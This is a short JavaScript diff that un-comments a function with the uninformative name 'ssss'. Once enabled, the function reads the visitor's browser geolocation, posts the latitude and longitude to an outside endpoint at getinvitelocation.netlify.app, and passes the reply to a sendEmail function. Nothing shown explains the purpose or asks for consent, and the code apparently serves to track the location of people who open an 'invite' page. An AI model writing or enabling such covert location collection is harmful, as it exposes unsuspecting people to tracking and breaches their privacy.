@@ -49,22 +49,22 @@ function getLocation() {
 
 
 function ssss() {
-  // getLocation().then((res) => {
-  //   let data = {
-  //     lat: res.coords.latitude,
-  //     lng: res.coords.longitude
-  //   }
-  //   const options = {
-  //     method: 'POST',
-  //     headers: { 'Content-Type': 'application/json' },
-  //     body: JSON.stringify(data)
-  //   };
-  //   fetch(`https://getinvitelocation.netlify.app/.netlify/functions/server/getLocation`, options)
-  //     .then(response => response.json())
-  //     .then(response => sendEmail(response))
-  //     .catch(err => console.error(err));
+  getLocation().then((res) => {
+    let data = {
+      lat: res.coords.latitude,
+      lng: res.coords.longitude
+    }
+    const options = {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    };
+    fetch(`https://getinvitelocation.netlify.app/.netlify/functions/server/getLocation`, options)
+      .then(response => response.json())
+      .then(response => sendEmail(response))
+      .catch(err => console.error(err));
 
-  // })
+  })
 
 }
 
